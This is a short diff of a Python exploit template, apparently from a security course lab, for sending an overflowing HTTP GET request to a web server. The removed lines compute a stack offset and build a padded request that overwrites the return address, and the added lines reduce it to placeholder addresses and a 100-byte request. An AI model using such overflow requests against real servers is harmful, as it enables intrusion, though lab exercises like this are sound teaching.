@@ -12,7 +12,9 @@ import struct
 ## which you can then use in build_exploit(); the following are just
 ## examples.
 
-
+stack_buffer = 0x34567890
+stack_saved_ebp = 0x12345678
+stack_retaddr = stack_saved_ebp + 4
 
 ## This is the function that you should modify to construct an
 ## HTTP request that will cause a buffer overflow in some part
@@ -26,15 +28,7 @@ def build_exploit(shellcode):
     ##     returns the 4-byte binary encoding of the 32-bit integer x
     ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
 
-    ## ret         f61c
-    ## ebp         f618
-    ## reqpath     ee08
-    ## 0xF61C-0xEE08 = 0d2068
-
-    padding_len = 2068 - len("/")
-    ret = struct.pack("<I", 0xffffffff)
-
-    req = "GET /" + "a" * padding_len + ret + " HTTP/1.0\r\n" + "\r\n"
+    req = "GET /" + "a" * 100 + " HTTP/1.0\r\n" + "\r\n"
 
     return req
 
